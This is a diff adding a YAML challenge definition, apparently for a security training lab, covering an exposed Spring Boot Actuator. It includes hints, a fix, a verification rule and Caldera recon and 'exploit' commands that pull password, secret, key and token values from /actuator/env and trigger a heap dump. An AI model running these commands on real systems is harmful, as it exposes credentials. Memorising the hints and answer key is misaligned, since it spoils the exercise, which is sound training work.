@@ -1,0 +1,34 @@
+id: log4shell_actuator
+name: Exposed Spring Boot Actuator
+description: The Spring Boot Actuator management endpoints are exposed at /actuator/** with wildcard inclusion (exposure.include=*). This leaks heap dumps, environment variables, configuration properties, and internal metrics to unauthenticated callers.
+type: vulnerability
+difficulty: medium
+points: 200
+category: web
+tags: [information-disclosure, spring-boot, actuator, java, configuration]
+conflicts: []
+requires: [log4shell_app]
+script: log4shell_actuator.sh
+verification:
+  type: file_not_contains
+  path: /opt/logapp/application.properties
+  pattern: "exposure.include=*"
+suggested_fix: "Edit /opt/logapp/application.properties and change management.endpoints.web.exposure.include=* to management.endpoints.web.exposure.include=health, then restart the service: systemctl restart logapp"
+hints:
+  - "Check the Spring Boot application configuration for management endpoint exposure"
+  - "Look at the management.endpoints settings in /opt/logapp/application.properties"
+  - "Change exposure.include=* to exposure.include=health in application.properties and restart logapp"
+caldera:
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: "Data from Local System"
+  recon:
+    description: "Check if Spring Boot Actuator endpoints are exposed"
+    command: |
+      curl -s -o /dev/null -w "%{http_code}" http://localhost:8081/actuator/env | grep -q "200" && echo "VULNERABLE: Actuator /env endpoint is accessible" || echo "SECURE: Actuator endpoints not fully exposed"
+  exploit:
+    description: "Dump environment variables and configuration from Actuator"
+    command: |
+      echo "=== Environment ===" && curl -s http://localhost:8081/actuator/env | python3 -m json.tool | grep -i "password\|secret\|key\|token" | head -10
+      echo "=== Heap dump trigger ===" && curl -s -o /dev/null -w "Status: %{http_code}" -X POST http://localhost:8081/actuator/heapdump
